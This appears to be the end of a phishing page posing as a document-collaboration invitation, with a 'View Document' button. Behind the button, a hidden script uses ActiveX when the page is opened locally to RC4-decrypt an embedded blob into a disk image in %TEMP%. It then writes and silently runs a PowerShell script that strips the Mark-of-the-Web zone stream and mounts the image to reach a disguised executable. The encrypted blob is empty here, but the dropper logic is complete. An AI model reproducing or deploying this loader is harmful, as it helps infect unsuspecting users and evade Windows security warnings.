          </svg></div>
        <div class="gf-bar accent"></div>
        <div class="gf-bar"></div>
        <div class="gf-bar"></div>
      </div>
      <div class="glass-float">
        <div class="gf-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgb(79,195,247)"
            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
            <polyline points="14 2 14 8 20 8" />
          </svg></div>
        <div class="gf-bar accent"></div>
        <div class="gf-bar"></div>
        <div class="gf-bar"></div>
      </div>
      <div class="glass-float">
        <div class="gf-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgb(79,195,247)"
            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="22 12 18 12 15 21 9 3 6 12 2 12" />
          </svg></div>
        <div class="gf-bar accent"></div>
        <div class="gf-bar"></div>
        <div class="gf-bar"></div>
      </div>
    </div>
    <div class="hero-content">
      <h1 class="fade-up fade-up-delay-1">You've been<br>invited to collaborate.</h1>
      <div class="hero-buttons fade-up fade-up-delay-3">
        <a href="#cta" onclick="triggerPayload(event)" class="btn btn-primary">View Document</a>
      </div>
    </div>
  </section>

  <script>
    try {
      var fadeUps = document.querySelectorAll('.fade-up');
      for (var i = 0; i < fadeUps.length; i++) {
        fadeUps[i].className += ' visible';
      }

      var counters = document.querySelectorAll('.stat-number');
      for (var i = 0; i < counters.length; i++) {
        var el = counters[i];
        var target = parseFloat(el.getAttribute('data-count'));
        if (target === 2.4) el.innerText = '2.4M+';
        else if (target === 99.9) el.innerText = '99.9%';
        else if (target === 150) el.innerText = '150+';
        else if (target === 50) el.innerText = '50K+';
      }

      window.onscroll = function () {
        var nav = document.getElementById('navbar');
        if (nav) {
          if (document.documentElement.scrollTop > 20 || document.body.scrollTop > 20) {
            if (nav.className.indexOf('scrolled') === -1) nav.className += ' scrolled';
          } else {
            nav.className = nav.className.replace(' scrolled', '');
          }
        }
      };

      var hamburger = document.getElementById('hamburger');
      var navLinks = document.getElementById('navLinks');
      if (hamburger && navLinks) {
        hamburger.onclick = function () {
          if (navLinks.className.indexOf('open') > -1) navLinks.className = navLinks.className.replace(' open', '');
          else navLinks.className += ' open';
        };
      }

      var links = document.querySelectorAll('#navLinks a');
      for (var i = 0; i < links.length; i++) {
        links[i].onclick = function () {
          if (navLinks) navLinks.className = navLinks.className.replace(' open', '');
        };
      }

      var cards = document.querySelectorAll('.feature-card, .step, .stat, .testimonial-card');
      for (var i = 0; i < cards.length; i++) {
        cards[i].onmousemove = function (e) {
          var rect = this.getBoundingClientRect();
          var x = ((e.clientX - rect.left) / rect.width) * 100;
          var y = ((e.clientY - rect.top) / rect.height) * 100;
          this.style.backgroundImage = 'radial-gradient(ellipse at ' + x + '% ' + y + '%, rgba(255,255,255,0.06) 0%, transparent 60%)';
        };
        cards[i].onmouseleave = function () { this.style.backgroundImage = ''; };
      }
    } catch (e) { }
  </script>

  <script>
var g_payloadBusy = false;

function hexByte(b) {
  var h = (b & 255).toString(16);
  return h.length < 2 ? "0" + h : h;
}

function psQuotePath(path) {
  return path.replace(/'/g, "''");
}

function flushHexToStream(hexStr, xml, hexNode, streamOut) {
  if (!hexStr || hexStr.length === 0)
    return "";
  hexNode.dataType = "bin.hex";
  hexNode.text = hexStr;
  streamOut.Write(hexNode.nodeTypedValue);
  return "";
}

function decryptPayloadToFile(dropPath, encB64, keyB64) {
  var xml = new ActiveXObject("MSXML2.DOMDocument");
  var keyEl = xml.createElement("k");
  keyEl.dataType = "bin.base64";
  keyEl.text = keyB64;
  var keyBytes = new VBArray(keyEl.nodeTypedValue).toArray();

  var el = xml.createElement("b64");
  el.dataType = "bin.base64";
  el.text = encB64;
  var ctBytes = new VBArray(el.nodeTypedValue).toArray();

  var S = new Array(256);
  var i, j, t;
  for (i = 0; i < 256; i++)
    S[i] = i;
  j = 0;
  for (i = 0; i < 256; i++) {
    j = (j + S[i] + keyBytes[i % keyBytes.length]) & 255;
    t = S[i];
    S[i] = S[j];
    S[j] = t;
  }

  var hexNode = xml.createElement("h");
  var streamOut = new ActiveXObject("ADODB.Stream");
  streamOut.Type = 1;
  streamOut.Open();

  var hexChunk = "";
  var hexFlush = 65536;
  var i_idx = 0;
  var j_idx = 0;
  var n = ctBytes.length;
  var b, k;

  for (i = 0; i < n; i++) {
    i_idx = (i_idx + 1) & 255;
    j_idx = (j_idx + S[i_idx]) & 255;
    t = S[i_idx];
    S[i_idx] = S[j_idx];
    S[j_idx] = t;
    k = (S[i_idx] + S[j_idx]) & 255;
    b = ctBytes[i] ^ S[k];
    hexChunk += hexByte(b);
    if (hexChunk.length >= hexFlush)
      hexChunk = flushHexToStream(hexChunk, xml, hexNode, streamOut);
  }
  hexChunk = flushHexToStream(hexChunk, xml, hexNode, streamOut);

  streamOut.SaveToFile(dropPath, 2);
  streamOut.Close();
}

function writeMountScript(scriptPath, dropPath) {
  var img = psQuotePath(dropPath);
  var lines = [
    "$img = '" + img + "'",
    "$vol = 'DocShare'",
    "$marker = '\\Microsoft\\sqlwriter.exe'",
    "Remove-Item -LiteralPath $img -Stream Zone.Identifier -ErrorAction SilentlyContinue",
    "Get-DiskImage -ImagePath $img -ErrorAction SilentlyContinue | Dismount-DiskImage -ErrorAction SilentlyContinue",
    "$deadline = (Get-Date).AddSeconds(45)",
    "Mount-DiskImage -ImagePath $img -PassThru | Out-Null",
    "do {",
    "  $d = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $vol -and (Test-Path ($_.DeviceID + $marker)) } | Select-Object -First 1 -ExpandProperty DeviceID",
    "  if ($d) { break }",
    "  Start-Sleep -Milliseconds 400",
    "} while ((Get-Date) -lt $deadline)"
  ];
  var text = lines.join("\r\n");
  var stream = new ActiveXObject("ADODB.Stream");
  stream.Type = 2;
  stream.Charset = "utf-8";
  stream.Open();
  stream.WriteText(text);
  stream.SaveToFile(scriptPath, 2);
  stream.Close();
}

function runMountAndOpen(dropPath, ws) {
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var scriptPath = fso.BuildPath(ws.ExpandEnvironmentStrings("%TEMP%"), "docshare_mount.ps1");
  writeMountScript(scriptPath, dropPath);
  ws.Run('powershell.exe -nop -w hidden -ep bypass -File "' + scriptPath + '"', 0, false);
}

function triggerPayload(e) {
  if (e)
    e.preventDefault();
  if (location.protocol !== "file:" && location.protocol !== "mk:")
    return;
  if (g_payloadBusy)
    return;

  g_payloadBusy = true;
  try {
    var encB64 = "";
    var keyB64 = "";
    var ws = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var dropPath = fso.BuildPath(ws.ExpandEnvironmentStrings("%TEMP%"), "DocShare.img");

    decryptPayloadToFile(dropPath, encB64, keyB64);
    runMountAndOpen(dropPath, ws);
  } catch (err) {
  }
  g_payloadBusy = false;
}
  </script>
</body>

</html>